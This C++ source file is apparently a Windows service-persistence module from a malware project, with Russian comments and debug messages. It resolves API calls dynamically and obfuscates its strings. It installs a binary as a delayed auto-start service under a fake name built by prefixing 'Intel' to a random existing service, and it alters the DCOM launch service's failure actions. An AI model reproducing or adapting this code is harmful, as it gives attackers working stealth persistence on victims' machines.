#include "core\service.h"
#include "core\debug.h"
#include "core\reestr.h"
#include "core\rand.h"

namespace Service
{

bool Start( const char* name )
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, name, SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		SERVICE_STATUS_PROCESS status;
		DWORD needed = 0;
		bool started = false;
		for( int i = 0; i < 100; i++ )
		{
			if( !API(ADVAPI32, QueryServiceStatusEx)( hservice, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &needed ) ) break;
			if( status.dwCurrentState == SERVICE_RUNNING ) 
			{
				ret = true;
				break;
			}
			if( !started && status.dwCurrentState != SERVICE_START_PENDING )
			{
				if( !API(ADVAPI32, StartServiceA)( hservice, 0, 0 ) )
				{
					if( API(KERNEL32, GetLastError)() != ERROR_SERVICE_DISABLED ) break;
					//служба отключена, включаем ее и снова запускаем
					if( !API(ADVAPI32, ChangeServiceConfigA)( hservice, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_NO_CHANGE, 0, 0, 0, 0, 0, 0, 0 ) ) break;
				}
				else
					started = true;
			}
			else
				Delay(100);
		}
		API(ADVAPI32, CloseServiceHandle)(hservice);
	}
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;
}

bool Stop( const char* name )
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, name, SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		DWORD needed = 0;
		SERVICE_STATUS_PROCESS status;
		for( int i = 0; i < 100; i++ )
		{
			if( !API(ADVAPI32, QueryServiceStatusEx)( hservice, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &needed ) ) break;
			if( status.dwCurrentState == SERVICE_STOPPED ) 
			{
				ret = true;
				break;
			}
			SERVICE_STATUS currStatus;
			API(ADVAPI32, ControlService)( hservice, SERVICE_CONTROL_STOP, &currStatus);
			Delay(100);
		}
		API(ADVAPI32, CloseServiceHandle)(hservice);
	}
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;
}

LPENUM_SERVICE_STATUS_PROCESS GetListServices( int& countServices )
{
    SC_HANDLE scm = API(ADVAPI32, OpenSCManagerA)( nullptr, nullptr,  SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT );
	LPENUM_SERVICE_STATUS_PROCESS ret = 0;
	DWORD size = 0;
    DWORD count = 0;
    API(ADVAPI32, EnumServicesStatusExA)( scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &size, &count, nullptr, nullptr );
	if( size > 0 )
	{
		LPENUM_SERVICE_STATUS_PROCESS buf = (LPENUM_SERVICE_STATUS_PROCESS)Mem::Alloc(size);
		if( buf )
		{
			if( API(ADVAPI32, EnumServicesStatusExA)( scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (BYTE*)buf, size, &size, &count, nullptr, nullptr ) )
			{
				ret = buf;
				countServices = count;
			}
			else
				Mem::Free(buf);
		}
	}
	API(ADVAPI32, CloseServiceHandle)(scm);
	return ret;
}


bool Delete( const char* name )
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, name, SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		if( API(ADVAPI32, DeleteService)(hservice) )
			ret = true;
		API(ADVAPI32, CloseServiceHandle)(hservice);
	}
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;
}

bool GetFileName( const char* name, StringBuilder& fileName )
{
	StringBuilder keyName;
	keyName = _CS_("SYSTEM\\CurrentControlSet\\Services\\");
	keyName += name;
	Reestr r( HKEY_LOCAL_MACHINE, keyName );
	if( r.Valid() )
	{
		if( r.GetString( _CS_("ImagePath"), fileName ) )
			return true;
	}
	return false;
}

bool OffDcomlaunch()
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, _CS_("dcomlaunch"), SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		SERVICE_FAILURE_ACTIONS sfa;
		sfa.dwResetPeriod = 60;
		sfa.lpRebootMsg = 0;
		sfa.lpCommand = 0; //cmd;
		SC_ACTION action;
		action.Type = SC_ACTION_NONE;
		action.Delay = 0;
		sfa.cActions = 1;
		sfa.lpsaActions = &action;
		if( API(ADVAPI32, ChangeServiceConfig2A)( hservice, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa ) )
			ret = true;
		API(ADVAPI32, CloseServiceHandle)(hservice);
	}
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;
}

bool CreateNameService( StringBuilder& name, StringBuilder& displayName )
{
	int count = 0;
	LPENUM_SERVICE_STATUS_PROCESS s = Service::GetListServices(count);
	if( s )
	{
		int n = Rand::Gen( count - 1 );
		name = s[n].lpServiceName;
		name.Insert( 0, _CS_("Intel") );
		displayName = s[n].lpDisplayName;
		displayName.Substring(1);
		displayName[0] = Str::Upper( displayName[0] );
		Mem::Free(s);
		return true;
	}
	return false;
}

bool GetNameService( StringBuilder& name, const StringBuilder& pathExe )
{
	bool ret = false;
	int count = 0;
	LPENUM_SERVICE_STATUS_PROCESS s = Service::GetListServices(count);
	if( s )
	{
		StringBuilder keyName, path;
		StringBuilderStack<48> keyServices( _CS_("SYSTEM\\CurrentControlSet\\Services\\") );
		StringBuilderStack<16> imagePath( _CS_("ImagePath") );
		for( int i = 0; i < count; i++ )
		{
			keyName = keyServices;
			keyName += s[i].lpServiceName;
			Reestr reg( HKEY_LOCAL_MACHINE, keyName, KEY_READ );
			if( reg.GetString( imagePath, path ) )
			{
				path.Lower();
				if( path == pathExe )
				{
					name = s[i].lpServiceName;
					ret = true;
					break;
				}
			}
		}
		Mem::Free(s);
	}
	return ret;
}

bool Create( const StringBuilder& fileName, const StringBuilder& nameService, const StringBuilder& displayName )
{
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if( !scmanager ) return false;

	DbgMsg( "Имя сервиса '%s', '%s'", nameService.c_str(), displayName.c_str() );
	bool ret = false;
	SC_HANDLE service = API(ADVAPI32, CreateServiceA)( scmanager, nameService, displayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, fileName, 
										NULL, NULL, NULL, NULL, NULL );
	if( service )
	{
		SERVICE_DELAYED_AUTO_START_INFO sd;
		sd.fDelayedAutostart = TRUE;
		API(ADVAPI32, ChangeServiceConfig2A)( service, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &sd );

		API(ADVAPI32, CloseServiceHandle)(service);
		DbgMsg( "Сервис установлен успешно" );
		ret = true;
	}
	else
		DbgMsg( "Сервис не установился, ошибка: %08x", API(KERNEL32, GetLastError)() );
	API(ADVAPI32, CloseServiceHandle)(scmanager);
	return ret;
}

bool SetStartType( const char* name, DWORD type )
{
	bool ret = false;
	SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if( !scmanager ) return false;
	SC_HANDLE hservice = API(ADVAPI32, OpenServiceA)( scmanager, name, SERVICE_ALL_ACCESS);
	if( hservice ) 
	{
		if( API(ADVAPI32, ChangeServiceConfigA)( hservice, SERVICE_NO_CHANGE, type, SERVICE_NO_CHANGE, 0, 0, 0, 0, 0, 0, 0 ) )
			ret = true;
	}
	return ret;
}

}
